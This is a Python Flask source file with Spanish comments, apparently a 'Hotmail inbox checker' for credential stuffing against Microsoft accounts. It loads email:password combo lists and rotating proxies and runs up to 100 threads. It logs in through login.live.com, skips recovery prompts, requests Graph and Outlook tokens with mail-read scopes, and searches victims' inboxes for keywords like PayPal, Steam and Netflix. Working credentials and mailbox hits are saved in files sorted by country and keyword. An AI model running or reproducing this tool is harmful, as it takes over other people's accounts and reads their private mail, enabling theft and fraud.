import os
import re
import time
import random
import threading
import concurrent.futures
import requests
import urllib3
import uuid
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

PORT = int(os.environ.get('PORT', 5000))

# ============================================
# CONFIGURACIÓN
# ============================================
CONFIG = {
    'threads': 100,
    'timeout': 15,
    'proxies_file': 'proxies.txt',
    'accounts_file': 'acc.txt'
}

# Intentar cargar config.ini
try:
    import configparser
    config = configparser.ConfigParser()
    if os.path.exists('config_inbox.ini'):
        config.read('config_inbox.ini', encoding='utf-8')
        CONFIG['threads'] = config.getint('General', 'threads', fallback=100)
        CONFIG['timeout'] = config.getint('General', 'timeout', fallback=15)
        CONFIG['proxies_file'] = config.get('General', 'proxies_file', fallback='proxies.txt')
        CONFIG['accounts_file'] = config.get('General', 'accounts_file', fallback='acc.txt')
except:
    pass

# ============================================
# ESTADO GLOBAL
# ============================================
checker_state = {
    'running': False,
    'stats': {
        'checked': 0,
        'valid': 0,
        'inbox': 0,
        'custom': 0,
        'bad': 0,
        '2fa': 0,
        'errors': 0,
        'retries': 0,
        'cpm': 0,
        'total': 0
    },
    'results': {
        'valid': [],
        'inbox': [],
        '2fa': [],
        'bad': [],
        'errors': []
    },
    'logs': [],
    'start_time': None,
    'session_folder': None
}

# ============================================
# FUNCIONES DE UTILIDAD
# ============================================
def get_flag(country_code: str) -> str:
    flag_map = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
        'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'BR': '🇧🇷', 'IN': '🇮🇳',
        'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺', 'MX': '🇲🇽',
        'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
        'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿',
        'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪', 'CH': '🇨🇭', 'AT': '🇦🇹',
        'BE': '🇧🇪', 'LU': '🇱🇺', 'IS': '🇮🇸', 'NZ': '🇳🇿', 'SG': '🇸🇬',
        'MY': '🇲🇾', 'ID': '🇮🇩', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'
    }
    return flag_map.get(country_code.upper(), '🏴')

def normalize_combo(line):
    line = line.strip()
    if not line:
        return None
    
    separators = [':', '|', ';', ',', ' ', '\t']
    for sep in separators:
        if sep in line:
            parts = line.split(sep, 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
    
    if '@' in line and line.count('@') == 1:
        return None
    
    return None

def parse_accounts(text):
    accounts = []
    for line in text.split('\n'):
        normalized = normalize_combo(line)
        if normalized:
            accounts.append(normalized)
    return accounts

def parse_keywords(text):
    return [line.strip() for line in text.split('\n') if line.strip() and not line.startswith('#')]

def parse_proxies(text):
    proxies = []
    for line in text.split('\n'):
        line = line.strip()
        if line:
            if line.startswith('http'):
                proxies.append(line)
            elif '@' in line:
                proxies.append(f"http://{line}")
            else:
                proxies.append(f"http://{line}")
    return proxies

def format_proxy(proxy):
    if not proxy: 
        return None
    proxy = proxy.strip()
    
    if proxy.startswith('http'):
        return proxy
        
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif '@' in proxy:
        return f"http://{proxy}"
    else:
        return f"http://{proxy}"

def get_session_folder():
    if checker_state['session_folder'] is None:
        base = "Results"
        if not os.path.exists(base):
            os.makedirs(base)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        checker_state['session_folder'] = os.path.join(base, f"Inbox_{timestamp}")
        os.makedirs(checker_state['session_folder'], exist_ok=True)
        os.makedirs(os.path.join(checker_state['session_folder'], "Countries"), exist_ok=True)
        os.makedirs(os.path.join(checker_state['session_folder'], "Keywords"), exist_ok=True)
    return checker_state['session_folder']

def save_result(filename, content):
    folder = get_session_folder()
    path = os.path.join(folder, filename)
    with open(path, 'a', encoding='utf-8') as f:
        f.write(content + '\n')

def save_country_result(country, email, password):
    folder = os.path.join(get_session_folder(), 'Countries')
    path = os.path.join(folder, f"{country}.txt")
    with open(path, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")

def save_keyword_result(keyword, content):
    safe_name = re.sub(r'[<>:"/\\|?*]', '_', keyword.strip()) or 'keyword'
    folder = os.path.join(get_session_folder(), 'Keywords')
    path = os.path.join(folder, f"{safe_name}.txt")
    with open(path, 'a', encoding='utf-8') as f:
        f.write(content + '\n')

def create_optimized_session():
    session = requests.Session()
    threads = CONFIG.get('threads', 100)
    pool_size = threads + 50
    
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=pool_size, pool_maxsize=pool_size)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

def add_log(message, level='info'):
    timestamp = datetime.now().strftime('%H:%M:%S')
    checker_state['logs'].insert(0, {
        'time': timestamp,
        'message': message,
        'level': level
    })
    if len(checker_state['logs']) > 500:
        checker_state['logs'] = checker_state['logs'][:500]

def update_stats():
    stats = checker_state['stats']
    if stats['checked'] > 0 and checker_state['start_time']:
        elapsed = time.time() - checker_state['start_time']
        if elapsed > 0:
            stats['cpm'] = int(stats['checked'] / elapsed * 60)

# ============================================
# CLASE MICROSOFT INBOX CHECKER (COMPLETA)
# ============================================
class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None, inbox_keywords=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
        self.session = create_optimized_session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.access_token = None
        self.cid = None
        self.country = None
        self.name = None
        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

    def get_urlPost_sFTTag(self):
        maxretries = 3
        attempts = 0
        
        while attempts < maxretries:
            try:
                headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'keep-alive', 
                    'Upgrade-Insecure-Requests': '1'
                }
                
                text = self.session.get(self.sFTTag_url, headers=headers, timeout=CONFIG['timeout'], verify=False).text
                
                match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                       re.search('value="(.+?)"', text, re.S) or \
                       re.search("sFTTag:'(.+?)'", text, re.S) or \
                       re.search('sFTTag:"(.+?)"', text, re.S) or \
                       re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                
                if match:
                    sFTTag = match.group(1)
                    match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                           re.search("urlPost:'(.+?)'", text, re.S) or \
                           re.search('urlPost:"(.+?)"', text, re.S) or \
                           re.search('<form.*?action="(.+?)"', text, re.S)
                    
                    if match:
                        urlPost = match.group(1)
                        urlPost = urlPost.replace('&amp;', '&')
                        return urlPost, sFTTag
            except Exception:
                pass
            
            attempts += 1
            time.sleep(0.5)
        
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        maxretries = 3
        tries = 0
        
        while tries < maxretries:
            try:
                data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded', 
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'close'
                }
                
                login_request = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                
                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return 'SUCCESS'
                
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        
                        if ipt and pprid and uaid:
                            data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                            if action:
                                ret = self.session.post(action.group(), data=data, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        return 'SUCCESS'
                    except:
                        pass
                
                elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return '2FA'
                
                elif any(value in login_request.text.lower() for value in [
                    'password is incorrect', 
                    "account doesn't exist", 
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    "tried to sign in too many times with an incorrect account or password",
                    'help us protect your account'
                ]):
                    return 'BAD'
                
            except Exception:
                pass
            
            tries += 1
            time.sleep(0.5)
        
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            return 'BAD'
        
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_graph_token(self):
        try:
            client_id = '0000000048170EF2'
            scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite'
            
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                scope = 'https://graph.microsoft.com/Mail.Read'
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
            
            return token
        except:
            return None

    def get_profile_via_graph(self, token):
        try:
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }
            
            r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
                if not self.country or self.country == 'Unknown':
                    try:
                        r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings', headers=headers, timeout=10, verify=False)
                        if r2.status_code == 200:
                            settings = r2.json()
                            self.country = settings.get('timeZone', 'Unknown')
                    except:
                        pass
                
                self.name = data.get('displayName', 'Unknown')
                return True
            return False
        except:
            return False

    def get_profile_via_substrate(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                return False
            
            self.cid = self.session.cookies.get('MSPCID', self.email)
            
            headers = {
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{self.cid}',
                'Content-Type': 'application/json',
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json'
            }
            
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile', headers=headers, timeout=10, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
                self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
                return True
            return False
        except:
            return False

    def check_inbox_via_graph(self):
        token = self.get_graph_token()
        if not token:
            return 0, []
        
        found_info = []
        total_found_sum = 0
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        
        for keyword in self.inbox_keywords:
            try:
                query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25"
                r = self.session.get(query, headers=headers, timeout=10, verify=False)
                
                if r.status_code == 200:
                    data = r.json()
                    total = data.get('@odata.count', 0)
                    
                    if total == 0 and 'value' in data:
                        total = len(data['value'])
                    
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
                        
                        try:
                            query2 = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"body:{keyword}\"&$select=subject&$top=25"
                            r2 = self.session.get(query2, headers=headers, timeout=10, verify=False)
                            if r2.status_code == 200:
                                data2 = r2.json()
                                total2 = data2.get('@odata.count', len(data2.get('value', [])))
                                if total2 > 0:
                                    total_found_sum += total2
                                    found_info.append(f"{keyword}(body): {total2}")
                        except:
                            pass
            except:
                pass
        
        return total_found_sum, found_info

    def check_inbox(self):
        total_found, found_info = self.check_inbox_via_graph()
        
        if total_found > 0:
            return total_found, found_info
        
        token = self.get_access_token_for_outlook()
        if not token:
            return 0, []
        
        cid = self.session.cookies.get('MSPCID', self.email)
        
        headers = {
            'Authorization': f'Bearer {token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json',
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Host': 'substrate.office.com'
        }

        found_info = []
        total_found_sum = 0
        
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        
        for keyword in self.inbox_keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0,
                        'Query': {'QueryString': keyword},
                        'Size': 25,
                        'EnableTopResults': True,
                        'TopResultsCount': 3
                    }],
                    'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                }
                
                r = self.session.post(url, json=payload, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if 'Total' in result_set:
                                        total = result_set['Total']
                                    elif 'ResultCount' in result_set:
                                        total = result_set['ResultCount']
                                    elif 'Results' in result_set:
                                        total = len(result_set['Results'])
                    
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
            except:
                pass
                
        return total_found_sum, found_info

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
                
            return token
        except:
            return None

# ============================================
# FUNCIÓN DE VERIFICACIÓN DE CUENTA
# ============================================
def check_account(email, password, keywords, proxies):
    if not checker_state['running']:
        return
    
    try:
        proxy = None
        if proxies:
            proxy = format_proxy(random.choice(proxies))
        
        checker = MicrosoftInboxChecker(email, password, proxy, inbox_keywords=keywords)
        
        status = checker.login()

        if status == 'SUCCESS':
            with threading.Lock():
                checker_state['stats']['valid'] += 1
            
            save_result('Valid.txt', f"{email}:{password}")
            
            graph_token = checker.get_graph_token()
            country_obtained = False
            country = 'Unknown'
            
            if graph_token:
                if checker.get_profile_via_graph(graph_token):
                    country = checker.country or 'Unknown'
                    country_obtained = True
            
            if not country_obtained:
                if checker.get_profile_via_substrate():
                    country = checker.country or 'Unknown'
            
            if country and country != 'Unknown':
                save_country_result(country, email, password)
            
            total_count, inbox_hits = checker.check_inbox()
            
            flag = get_flag(country) if country != 'Unknown' else '🏴'
            
            if total_count > 0:
                hits_str = ' | '.join(inbox_hits)
                save_string = f"{email}:{password} | {country} | {total_count} Email Found | [{hits_str}]"
                save_result('Inbox.txt', save_string)
                for hit in inbox_hits:
                    if ': ' in hit:
                        kw, count = hit.rsplit(': ', 1)
                        line = f"{email}:{password} | {country} | {count} Email Found | [{kw}: {count}]"
                        save_keyword_result(kw, line)
                
                with threading.Lock():
                    checker_state['stats']['inbox'] += 1
                
                add_log(f"📬 {email} - INBOX HITS: {total_count} emails ({country}) | {hits_str}", 'success')
                
            else:
                add_log(f"✅ {email} - VALID ({country})", 'success')
            
        elif status == '2FA':
            with threading.Lock():
                checker_state['stats']['2fa'] += 1
            save_result('2FA.txt', f"{email}:{password}")
            add_log(f"🔐 {email} - 2FA REQUIRED", 'warning')
            
        else:
            with threading.Lock():
                checker_state['stats']['bad'] += 1
            add_log(f"❌ {email} - INVALID", 'error')
    
    except Exception as e:
        with threading.Lock():
            checker_state['stats']['errors'] += 1
        add_log(f"⚠️ {email} - ERROR: {str(e)}", 'error')
    
    finally:
        with threading.Lock():
            checker_state['stats']['checked'] += 1
        update_stats()

# ============================================
# RUTAS DE LA API
# ============================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/start', methods=['POST'])
def start_checking():
    if checker_state['running']:
        return jsonify({'error': 'Already running'}), 400
    
    data = request.json
    accounts = parse_accounts(data.get('accounts', ''))
    keywords = parse_keywords(data.get('keywords', ''))
    proxies = parse_proxies(data.get('proxies', ''))
    threads = int(data.get('threads', CONFIG['threads']))
    
    if not accounts:
        return jsonify({'error': 'No valid accounts found'}), 400
    
    if not keywords:
        keywords = ["Steam", "Netflix", "PayPal", "Amazon", "Security Alert"]
    
    # Resetear estado
    checker_state['running'] = True
    checker_state['stats'] = {
        'checked': 0, 'valid': 0, 'inbox': 0, 'custom': 0,
        'bad': 0, '2fa': 0, 'errors': 0, 'retries': 0, 'cpm': 0,
        'total': len(accounts)
    }
    checker_state['results'] = {'valid': [], 'inbox': [], '2fa': [], 'bad': [], 'errors': []}
    checker_state['logs'] = []
    checker_state['start_time'] = time.time()
    checker_state['session_folder'] = None  # Reset para nueva sesión
    
    get_session_folder()
    
    add_log(f"🚀 Iniciando verificación de {len(accounts)} cuentas", 'info')
    add_log(f"📝 Keywords: {', '.join(keywords)}", 'info')
    add_log(f"📡 Proxies: {len(proxies)}", 'info')
    add_log(f"⚙️ Hilos: {threads}", 'info')
    add_log(f"📁 Session folder: {get_session_folder()}", 'info')
    
    # Ejecutar en hilo separado
    thread = threading.Thread(target=run_checker, args=(accounts, keywords, proxies, threads))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'success': True,
        'total': len(accounts)
    })

def run_checker(accounts, keywords, proxies, max_threads):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for account in accounts:
                if not checker_state['running']:
                    break
                email, password = account.split(':', 1)
                future = executor.submit(check_account, email, password, keywords, proxies)
                futures.append(future)
            
            for future in concurrent.futures.as_completed(futures):
                if not checker_state['running']:
                    break
                try:
                    future.result()
                except:
                    pass
    finally:
        checker_state['running'] = False
        elapsed = time.time() - checker_state['start_time']
        add_log(f"✅ Verificación completada en {int(elapsed)}s", 'success')
        add_log(f"📊 Válidos: {checker_state['stats']['valid']} | Inbox: {checker_state['stats']['inbox']} | 2FA: {checker_state['stats']['2fa']} | Inválidos: {checker_state['stats']['bad']}", 'info')
        add_log(f"📁 Resultados guardados en: {get_session_folder()}", 'info')

@app.route('/api/stop', methods=['POST'])
def stop_checking():
    checker_state['running'] = False
    add_log("⏹️ Detenido por el usuario", 'warning')
    return jsonify({'success': True})

@app.route('/api/status', methods=['GET'])
def get_status():
    update_stats()
    return jsonify({
        'running': checker_state['running'],
        'stats': checker_state['stats'],
        'logs': checker_state['logs'][:30],
        'results': checker_state['results'],
        'session_folder': get_session_folder()
    })

@app.route('/api/export', methods=['POST'])
def export_results():
    lines = ['=== HOTMAIL CHECKER RESULTS ===']
    lines.append(f'Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    lines.append(f'Session: {get_session_folder()}')
    lines.append('')
    
    if checker_state['results']['valid']:
        lines.append('--- VALID ACCOUNTS ---')
        lines.extend(checker_state['results']['valid'])
        lines.append('')
    
    if checker_state['results']['inbox']:
        lines.append('--- INBOX HITS ---')
        lines.extend(checker_state['results']['inbox'])
        lines.append('')
    
    if checker_state['results']['2fa']:
        lines.append('--- 2FA ACCOUNTS ---')
        lines.extend(checker_state['results']['2fa'])
        lines.append('')
    
    if checker_state['results']['bad']:
        lines.append('--- INVALID ACCOUNTS ---')
        lines.extend(checker_state['results']['bad'])
    
    content = '\n'.join(lines)
    filename = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    
    return send_file(filename, as_attachment=True)

@app.route('/api/config', methods=['GET'])
def get_config():
    return jsonify(CONFIG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
